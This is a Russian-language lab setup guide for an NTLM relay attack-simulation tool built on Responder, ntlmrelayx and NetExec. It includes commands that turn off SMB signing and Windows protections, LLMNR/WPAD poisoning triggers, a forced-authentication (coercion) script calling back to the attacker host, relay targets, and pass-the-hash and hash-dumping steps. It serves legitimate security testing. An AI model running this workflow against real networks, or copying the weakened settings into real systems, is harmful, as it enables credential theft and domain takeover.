# Требования к лабораторной инфраструктуре

> **Назначение:** Описание минимальной и рекомендуемой конфигурации лаборатории для полноценного тестирования всех функций btc-module-relay-nxc-impckt-rspndr.

---

## 1. Общие требования

| Параметр | Минимум | Рекомендуемо |
|----------|---------|--------------|
| Гипервизор | VMware Workstation / Proxmox / VirtualBox | VMware ESXi / Proxmox VE (VLAN support) |
| Хостовая ОС | Linux (Kali / Ubuntu) | Kali Linux 2024+ |
| RAM хоста | 16 GB | 32 GB |
| Disk | 200 GB SSD | 500 GB NVMe |
| Сеть | Flat L2 сегмент | VLAN с DHCP + DNS |

---

## 2. Топология сети

```
+-----------------------------------------------------------------------------+
|                         LAB SEGMENT 192.168.50.0/24                         |
|                                                                             |
|   +-------------+      +--------------+      +--------------------------+   |
|   |  BAS Host   |      |   Victim-1   |      |      DC (AD DS)          |   |
|   |  Kali Linux |<---->|  Win 10/11   |<---->|  Windows Server 2022     |   |
|   |192.168.50.10|      | 192.168.50.15|      |  192.168.50.20           |   |
|   |             |      |              |      |  dc01.corp.local         |   |
|   |  [Docker]   |      |  User: jdoe  |      |  Domain: CORP.LOCAL      |   |
|   |             |      |  Pass: P@ss  |      |                          |   |
|   +------+------+      +--------------+      +------------+-------------+   |
|          |                                                 |                |
|          | LLMNR/NBT-NS/mDNS                               | LDAP/SMB       |
|          | WPAD                                            |                |
|          v                                                 v                |
|   +------------------------------------------------------------------+      |
|   |                      File Server (SMB Target)                    |      |
|   |              Windows Server 2022  192.168.50.21                  |      |
|   |              fs01.corp.local                                     |      |
|   |              SMB signing: OFF (required for relay)               |      |
|   +------------------------------------------------------------------+      |
|                                                                             |
|   +--------------+                                                          |
|   |  Victim-2    |        (опционально, для массового coercion)             |
|   |  Win 10      |                                                          |
|   | 192.168.50.16|                                                          |
|   +--------------+                                                          |
|                                                                             |
+-----------------------------------------------------------------------------+
```

---

## 3. Виртуальные машины

### 3.1 BAS Host (Kali Linux)

| Параметр | Значение |
|----------|----------|
| OS | Kali Linux 2024.3+ или Ubuntu 22.04+ |
| RAM | 4 GB |
| CPU | 2 cores |
| Disk | 60 GB |
| IP | 192.168.50.10/24 |
| Gateway | 192.168.50.1 |
| DNS | 192.168.50.20 (DC) |

**Установить:**
```bash
apt update && apt install -y docker.io docker-compose python3-poetry jq
usermod -aG docker $USER
```

**Сетевой интерфейс:** bridged adapter (VMnet0) в target segment.

> **Критично:** интерфейс BAS Host должен быть в том же L2-сегменте, что и жертвы. NAT не подходит — LLMNR/NBT-NS poisoning работает только в broadcast-domain.

---

### 3.2 Domain Controller (Windows Server 2022)

| Параметр | Значение |
|----------|----------|
| OS | Windows Server 2022 Standard Evaluation |
| RAM | 4 GB |
| CPU | 2 cores |
| Disk | 60 GB |
| Hostname | dc01 |
| FQDN | dc01.corp.local |
| IP | 192.168.50.20/24 |
| Domain | CORP.LOCAL |
| NetBIOS | CORP |
| Лес/домен функциональный уровень | Windows Server 2016+ |

**Установленные роли:**
- Active Directory Domain Services (AD DS)
- DNS Server
- DHCP Server (опционально, можно статику)
- Certificate Services (AD CS) — опционально, для AD CS relay тестов

**Пользователи для тестов:**

| Имя | Логин | Пароль | Группы |
|-----|-------|--------|--------|
| John Doe | corp\jdoe | Password123! | Domain Users |
| Admin | corp\admin | AdminPass456! | Domain Admins |
| SVC Backup | corp\svc_backup | Svc789! | Backup Operators |

**Дополнительно:**
- Создать SPN для svc_backup (для Kerberoasting тестов)
- Установить LAPS (Local Administrator Password Solution) — для post-auth laps module
- Настроить GPO: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options

---

### 3.3 File Server (SMB Relay Target)

| Параметр | Значение |
|----------|----------|
| OS | Windows Server 2022 Standard |
| RAM | 2 GB |
| CPU | 1 core |
| Disk | 40 GB |
| Hostname | fs01 |
| FQDN | fs01.corp.local |
| IP | 192.168.50.21/24 |
| Domain member | CORP.LOCAL |

**Настройки SMB (критично для relay):**

```powershell
# Отключить SMB signing (иначе relay не сработает)
Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force

# Отключить Extended Protection (для ntlmrelayx)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SmbServerNameHardeningLevel" -Value 0

# Перезагрузить SMB сервер
Restart-Service LanmanServer -Force
```

**Создать shares:**
```powershell
New-Item -Path "C:\Shares\Data" -ItemType Directory -Force
New-SmbShare -Name "Data" -Path "C:\Shares\Data" -FullAccess "CORP\Domain Users"
```

**SPN для SMB:**
```powershell
setspn -S HOST/fs01.corp.local CORP\fs01$
```

---

### 3.4 Victim Workstation (Windows 10/11)

| Параметр | Значение |
|----------|----------|
| OS | Windows 10 Pro 22H2 или Windows 11 Pro |
| RAM | 4 GB |
| CPU | 2 cores |
| Disk | 60 GB |
| Hostname | wkst01 |
| IP | 192.168.50.15/24 (DHCP или статика) |
| Domain member | CORP.LOCAL |
| Локальный админ | .\admin / LocalPass123! |

**Настройки для poisoning (enabled by default, проверить):**

```powershell
# LLMNR — должен быть включен (default)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast"
# Если значение 0 — LLMNR отключен через GPO. Для тестов нужно 1 или не задано.

# NBT-NS — должен быть включен
# Network Connections -> IPv4 Properties -> Advanced -> WINS -> Enable NetBIOS over TCP/IP

# WPAD — должен быть включен
# Internet Options -> Connections -> LAN Settings -> Automatically detect settings
```

**Пользователь должен быть залогинен интерактивно** (не через RDP, а локально или через консоль VMware) — тогда LLMNR-запросы будут активными.

---

## 4. Active Directory Конфигурация

### 4.1 DNS Forward Lookup Zones

На DC создать зону corp.local с записями:

| Имя | Тип | IP |
|-----|-----|-----|
| @ | A | 192.168.50.20 |
| dc01 | A | 192.168.50.20 |
| fs01 | A | 192.168.50.21 |
| _ldap._tcp | SRV | dc01.corp.local:389 |

### 4.2 DHCP (опционально)

Если DHCP на DC:
- Scope: 192.168.50.100 - 192.168.50.200
- Gateway: 192.168.50.1
- DNS: 192.168.50.20
- Domain name: corp.local

### 4.3 Group Policy (GPO)

**GPO: "BAS Test — Disable SMB Signing"**
- Path: Computer Config -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options
- Setting: "Microsoft network server: Digitally sign communications (always)" -> Disabled
- Setting: "Microsoft network server: Digitally sign communications (if client agrees)" -> Disabled
- Применить к OU с File Server и DC (если тестируем relay на DC)

**GPO: "BAS Test — Enable LLMNR"**
- Path: Computer Config -> Administrative Templates -> Network -> DNS Client
- Setting: "Turn off multicast name resolution" -> Disabled (или Not Configured)

---

## 5. Сетевая конфигурация хоста (гипервизор)

### 5.1 VMware Workstation

Создать VMnet (Host-Only или Bridged):
- VMnet2 (Host-Only) с subnet 192.168.50.0/24
- Все VM подключены к VMnet2
- BAS Host подключен к VMnet2 (bridged или host-only)
- Отключить NAT на этом VMnet — иначе multicast пакеты могут не ходить

### 5.2 Proxmox VE

Создать Linux Bridge vmbr1 без IP:
```
auto vmbr1
iface vmbr1 inet manual
    bridge-ports none
    bridge-stp off
    bridge-fd 0
```

Все VM подключены к vmbr1. BAS Host тоже на vmbr1.

### 5.3 Сетевые требования (критично)

| Требование | Почему важно |
|------------|--------------|
| Все VM в одном L2-сегменте | LLMNR/NBT-NS/mDNS — broadcast/multicast |
| Нет AP Isolation / Client Isolation | Жертва должна достучаться до BAS Host |
| Нет Windows Firewall между жертвой и BAS Host | SMB/HTTP/WPAD соединения должны проходить |
| DHCP опционален, но DNS нужен | Для domain join и WPAD |

---

## 6. Настройка BAS Host

### 6.1 Клонирование и установка

```bash
ssh kali@192.168.50.10
git clone https://github.com/NanoTrash/btc-module-relay-nxc-impckt-rspnd.git
cd btc-module-relay-nxc-impckt-rspnd
poetry install
```

### 6.2 Сборка образов

```bash
for img in impacket netexec responder; do
  docker build -t btc-relay/${img}:latest docker/${img}
done
```

### 6.3 Конфигурация config.yaml

```yaml
project_name: "btc-module-relay-nxc-impckt-rspndr"
log_level: "INFO"
output_jsonl: "sessions.jsonl"

docker:
  impacket_image: "btc-relay/impacket:latest"
  netexec_image: "btc-relay/netexec:latest"
  responder_image: "btc-relay/responder:latest"
  network_mode: "host"
  loot_dir: "./loot"
  logs_dir: "./logs"
  responder_config_dir: "./responder"

ntlmrelayx:
  enabled: true
  interface_ip: "0.0.0.0"
  smb_port: 445
  http_port: "80"
  wcf_port: 9389
  raw_port: 6666
  rpc_port: 135
  targets_file: "./targets_relay.txt"
  smb2support: true
  keep_relaying: true
  no_winrm_server: false

responder:
  enabled: true
  interface: "eth0"       # <- заменить на реальный интерфейс BAS Host
  wpad: true
  dns: true

coerce:
  enabled: true
  methods:
    - "coerce_plus"
  targets:
    - "192.168.50.15"    # <- Victim-1
    - "192.168.50.16"    # <- Victim-2 (если есть)
  callback_host: "192.168.50.10"   # <- IP BAS Host
  always: false
  delay_between: 5.0
  workers: 4

post_auth:
  enabled: true
  protocols:
    smb:
      enabled: true
      commands: ["--shares", "--users"]
      modules: []
    ldap:
      enabled: true
      commands: ["--users"]
      modules: ["laps", "bloodhound"]
    winrm:
      enabled: true
      commands: ["--whoami"]
      modules: []
    mssql:
      enabled: false
      commands: []
      modules: []
    ssh:
      enabled: false
      commands: []
      modules: []
    rdp:
      enabled: false
      commands: []
      modules: []
  workers: 4
```

### 6.4 targets_relay.txt

```bash
cat > targets_relay.txt << 'EOF'
smb://fs01.corp.local
smb://dc01.corp.local
ldaps://dc01.corp.local
EOF
```

---

## 7. Пошаговая проверка функционала

### 7.1 Phase 0: Connectivity Check

```bash
# С BAS Host проверяем доступность всех VM
nmap -sn 192.168.50.0/24

# Проверяем SMB на target'ах
nxc smb 192.168.50.21 -u '' -p ''
```

### 7.2 Phase 1: Responder Poisoning

```bash
poetry run btc-relay-rspndr start -c config.yaml
```

**На Victim-1 выполнить:**
```cmd
# Триггер LLMNR
net view \\NONEXISTENT

# Триггер NBT-NS
nbtstat -A 192.168.50.10

# Триггер WPAD
# Открыть IE/Edge, попытаться открыть любой сайт — WPAD auto-discovery запустится
```

**Ожидаемый результат в logs/Poisoners-Session.log:**
```
[*] [LLMNR]  Poisoned answer sent to 192.168.50.15 for name NONEXISTENT
[*] [NBT-NS] Poisoned answer sent to 192.168.50.15 for name WPAD
```

### 7.3 Phase 2: Coercion

Инструмент автоматически запускает coercion. Либо вручную:

```bash
poetry run python -c "
from btc_module_relay_nxc_impckt_rspndr.controller.nxc_ctrl import NxcController
from btc_module_relay_nxc_impckt_rspndr.config import AppConfig

cfg = AppConfig.from_yaml('config.yaml')
nxc = NxcController(cfg)
success, stdout = nxc.coerce('192.168.50.15', 'coerce_plus', '192.168.50.10')
print('Success:', success)
"
```

**Ожидаемый результат:**
- PetitPotam или PrinterBug сработал
- В logs/ntlmrelayx.log появляется:
  ```
  [*] SMBD-Thread-X: Received connection from 192.168.50.15, attacking target smb://fs01.corp.local
  ```

### 7.4 Phase 3: SMB Relay

Если coercion сработал, ntlmrelayx автоматически поймает NTLM и порелейит.

**Ручная проверка (опционально):**
```bash
# С BAS Host попытаться SMB-аутентификацию к себе же
# (ntlmrelayx слушает на 445)
smbclient -L //127.0.0.1 -N
```

**Ожидаемый результат:**
```
[*] Authenticating against smb://fs01.corp.local as CORP\jdoe SUCCEED
```

### 7.5 Phase 4: LDAP/LDAPS Relay

Добавить в targets_relay.txt:
```
ldap://dc01.corp.local
ldaps://dc01.corp.local
```

**Триггер:** coercion + LDAP query от жертвы.

**Ожидаемый результат:**
```
[*] Authenticating against ldaps://dc01.corp.local as CORP\jdoe SUCCEED
[*] Dumping domain info...
```

### 7.6 Phase 5: Post-Auth

После RELAY_SUCCESS оркестратор автоматически запускает post-auth.

**Проверить результаты:**
```bash
# SMB shares
tail -f sessions.jsonl | jq '.result.parsed | select(.protocol=="smb")'

# LDAP users + LAPS
tail -f sessions.jsonl | jq '.result.parsed | select(.protocol=="ldap")'

# Raw loot
cat loot/hashes* | grep -i corp
```

---

## 8. Расширенные сценарии

### 8.1 AD CS Relay (ESC1/ESC8)

Если на DC установлен AD CS:
```yaml
ntlmrelayx:
  command: null
  # В _build_command добавить: --adcs --template DomainController
```

### 8.2 SOCKS Proxy

```yaml
ntlmrelayx:
  socks: true
  socks_port: 1080
```

После relay success:
```bash
proxychains nxc smb 192.168.50.21 -u corp\jdoe -H <hash>
```

### 8.3 HTTP Relay (WebDAV)

На Victim-1 выполнить:
```cmd
# Открыть \\192.168.50.10@80\share в Explorer
# Или через Word: Открыть -> http://192.168.50.10/test.doc
```

**Требование:** ntlmrelayx HTTP server слушает на 80 (default).

### 8.4 Множественные жертвы (Coerce + Always)

```yaml
coerce:
  always: true
  targets:
    - "192.168.50.15"
    - "192.168.50.16"
    - "192.168.50.17"
  workers: 8
```

---

## 9. Чек-лист готовности лабы

- [ ] DC поднят, домен CORP.LOCAL создан
- [ ] File Server в домене, SMB signing отключен
- [ ] Victim-1 в домене, залогинен интерактивно
- [ ] Все VM в одном L2-сегменте (ping работает между всеми)
- [ ] BAS Host имеет IP в том же сегменте
- [ ] Docker установлен, образы собраны
- [ ] config.yaml настроен (interface, targets, callback_host)
- [ ] targets_relay.txt содержит smb:// и ldaps:// target'ы
- [ ] Интеграционный тест проходит: poetry run python tests/test_integration.py
- [ ] Ручной nxc smb scan проходит: nxc smb 192.168.50.21 -u '' -p ''

---

## 10. Известные ограничения

| Ограничение | Обход |
|-------------|-------|
| Windows 10 1709+ требует LDAP signing | Relay на LDAP может не сработать; используй LDAPS |
| Windows Server 2019+ SMB signing by default | Отключить через GPO или тестируй на Win 2016 |
| Credential Guard (HVCI) | Блокирует NTLM theft; отключи на Victim для тестов |
| Windows Defender SmartScreen | Может блокировать WPAD; отключи для тестов |
| Managed Networks (802.1X) | WPAD может не работать; используй coercion |

---

Document version: 1.0
Scope: btc-module-relay-nxc-impckt-rspndr v0.2.0
